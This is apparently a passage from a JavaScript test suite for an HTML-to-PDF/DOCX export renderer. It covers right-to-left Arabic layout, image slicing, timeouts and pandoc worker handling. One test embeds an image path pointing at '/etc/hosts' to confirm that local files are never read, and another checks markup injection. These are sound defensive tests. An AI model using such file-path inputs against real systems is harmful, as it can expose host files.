    const paragraphs = docxParagraphs(xml);
    const find = (text) => paragraphs.find((p) => paragraphText(p) === text);
    // The Arabic table lays its columns out right to left, as the page does (pandoc alone does not, jgm/pandoc#7695).
    const [table] = xml.match(/<w:tbl>[\s\S]*?<\/w:tbl>/) || [];
    assert.ok(table && table.split('</w:tblPr>')[0].includes('<w:bidiVisual />'), 'the Arabic table is right to left');
    // The title too: the page sets it dir="auto", which pandoc keeps on a heading unless the file says rtl.
    for (const paragraph of ['الخلية', ...ARABIC, 'النواة', 'الغشاء']) {
      const found = find(paragraph);
      assert.ok(found, paragraph);
      assert.ok(found.includes('<w:bidi />') && found.includes('<w:rtl />'), paragraph);
    }
    const english = find('Mitochondria make ATP.');
    assert.ok(english && !english.includes('<w:bidi'), 'an English paragraph stays left to right');
    assert.ok(find('النواة').includes('<w:numPr>'), 'the list keeps its numbers');
  });

  test('a picture taller than a page goes in as page-sized slices, cut between its parts', async () => {
    const { log } = collectingLog();
    const rows = Array.from({ length: 40 }, (_, n) => `<div style="height:72px;border:1px solid #999">Event ${n + 1}</div>`);
    const doc = {
      title: 'Timeline',
      language: 'en',
      outputs: [{ kind: 'answer', chunks: [{ type: 'fixture-html', content: `<figure>${rows.join('')}</figure>` }] }],
    };
    const result = await renderer('/export-print', log)(doc, 'docx');
    const files = unzipSync(new Uint8Array(result.file));
    const media = Object.keys(files).filter((name) => name.startsWith('word/media/'));
    // 40 rows of 74 px at 688 px wide: about 2,960 px, shown 600 wide, so a page (860 px) holds about 986 px of it.
    assert.ok(media.length >= 3 && media.length <= 5, `${media.length} slices`);
    for (const name of media) {
      const png = Buffer.from(files[name]);
      const [width, height] = [png.readUInt32BE(16), png.readUInt32BE(20)];
      // Captured at twice the CSS size, never more than a page tall.
      assert.ok(width <= 688 * 2 && height <= Math.ceil((860 * 688) / 600) * 2, `${name} ${width}x${height}`);
      // Cut between rows: a slice is a whole number of 74 px rows (each row's border included).
      assert.equal(Math.round(height / 2) % 74, 0, `${name} cut inside a row: ${height}`);
    }
    assert.equal(result.imagesFailed, 0);
  });

  test('a Word conversion still running at the deadline ends with its worker, before the next render', async () => {
    const { log } = collectingLog();
    const hanging = new WordConverter({ workerUrl: new URL('./fixtures/hanging-word-worker.mjs', import.meta.url) });
    const stuck = createExportRenderer(browser, {
      printUrl: `http://127.0.0.1:${pagePort}/export-print`, log, word: hanging, options: { deadlineMs: 4000 },
    });
    await assert.rejects(stuck(DOC, 'docx'), (e) => e instanceof ExportTimeout);
    assert.equal(hanging.worker, null, 'the worker was ended');
    assert.equal(hanging.pending.size, 0, 'no job is left waiting');
  });

  test('a Word render with no converter fails with a code, and makes nothing', async () => {
    const { log } = collectingLog();
    const plain = createExportRenderer(browser, { printUrl: `http://127.0.0.1:${pagePort}/export-print`, log });
    await assert.rejects(plain(DOC, 'docx'), (e) => e instanceof ExportFailed && e.code === 'word_unavailable');
    await assert.rejects(plain(DOC, 'html'), (e) => e instanceof ExportFailed && e.code === 'bad_format');
  });

  test('a second export while one runs is ExportBusy; the deadline is ExportTimeout and frees the renderer', async () => {
    const { log, lines } = collectingLog();
    const stuck = renderer('/hang', log, { deadlineMs: 1500, teardownMs: 2000 });
    const first = stuck(DOC);
    await assert.rejects(stuck(DOC), (e) => e instanceof ExportBusy);
    await assert.rejects(first, (e) => e instanceof ExportTimeout);
    assert.ok(lines.some((l) => l.startsWith('[EXPORT] timed_out format=pdf stage=load')));
    // The renderer takes the next export once the timed-out one is torn down.
    await assert.rejects(stuck(DOC), (e) => e instanceof ExportTimeout);
  });
});

describe('WordConverter (pandoc in a worker thread)', { timeout: 60_000 }, () => {
  const html = '<p>Pressure <math><semantics><mi>p</mi><annotation encoding="application/x-tex">p</annotation></semantics></math></p>'
    + '<p><img src="picture-0.png" width="20" height="20" alt=""></p><p><img src="/etc/hosts" alt=""></p>';
  const pixel = Buffer.from(PIXEL.split(',')[1], 'base64');

  test('makes a .docx with only the pictures it is handed: a path on disk is never read', async () => {
    const word = new WordConverter();
    try {
      const { docx, missing } = await word.convert({ html, pictures: [{ name: 'picture-0.png', bytes: pixel }], language: 'en' }, 30_000);
      assert.ok(docx.subarray(0, 4).equals(DOCX_MAGIC));
      const { xml, media } = docxParts(docx);
      assert.equal(media.length, 1);
      assert.equal(missing, 1);
      assert.ok(xml.includes('<m:oMath>'));
      assert.ok(!xml.includes('localhost'), 'nothing from /etc/hosts');
    } finally {
      await word.close();
    }
  });

  test('a conversion past its time ends the worker with WordFailed; the next one starts a new worker', async () => {
    const word = new WordConverter();
    try {
      await assert.rejects(word.convert({ html, pictures: [], language: 'en' }, 1), (e) => e instanceof WordFailed && e.code === 'timeout');
      const { docx } = await word.convert({ html, pictures: [], language: 'en' }, 30_000);
      assert.ok(docx.subarray(0, 4).equals(DOCX_MAGIC));
    } finally {
      await word.close();
    }
  });
});

describe('rightToLeftTables', () => {
  const cell = (text, rtl) => `<w:tc><w:p>${rtl ? '<w:pPr><w:bidi /></w:pPr>' : ''}<w:r><w:t>${text}</w:t></w:r></w:p></w:tc>`;
  const table = (cells) => `<w:tbl><w:tblPr><w:tblStyle w:val="Table" /><w:tblW w:type="pct" w:w="5000" /></w:tblPr>`
    + `<w:tr>${cells.join('')}</w:tr></w:tbl>`;

  test('a table whose paragraphs are mostly right to left is laid out right to left, after its style', () => {
    const xml = table([cell('النواة', true), cell('ATP', false), cell('الغشاء', true)]);
    assert.equal(rightToLeftTables(xml), xml.replace('<w:tblStyle w:val="Table" />', '<w:tblStyle w:val="Table" /><w:bidiVisual />'));
  });

  test('a left-to-right table, half and half, or one with no text is left as it is', () => {
    for (const xml of [table([cell('Nucleus', false)]), table([cell('النواة', true), cell('ATP', false)]), table([])]) {
      assert.equal(rightToLeftTables(xml), xml);
    }
  });

  test('a table nested in another is judged on its own paragraphs, and so is its parent', () => {
    const inner = table([cell('النواة', true), cell('الغشاء', true), cell('الخلية', true)]);
    const outer = `<w:tbl><w:tblPr><w:tblStyle w:val="Table" /></w:tblPr><w:tr><w:tc><w:p><w:r><w:t>Cell</w:t></w:r></w:p>`
      + `${inner}<w:p><w:r><w:t>Parts</w:t></w:r></w:p></w:tc></w:tr></w:tbl>`;
    const out = rightToLeftTables(outer);
    assert.equal((out.match(/<w:bidiVisual \/>/g) || []).length, 1);
    assert.ok(out.startsWith('<w:tbl><w:tblPr><w:tblStyle w:val="Table" /></w:tblPr>'), 'the English parent stays left to right');
  });

  test('each table is judged on its own; a cell\'s text can\'t open a table', () => {
    const arabic = table([cell('النواة', true)]);
    const english = table([cell('&lt;w:tbl&gt; Nucleus', false)]);
    const out = rightToLeftTables(`<w:body>${english}${arabic}</w:body>`);
    assert.equal((out.match(/<w:bidiVisual \/>/g) || []).length, 1);
    assert.ok(out.indexOf('<w:bidiVisual />') > out.indexOf('النواة') - 200 && out.startsWith(`<w:body>${english}`));
  });
});
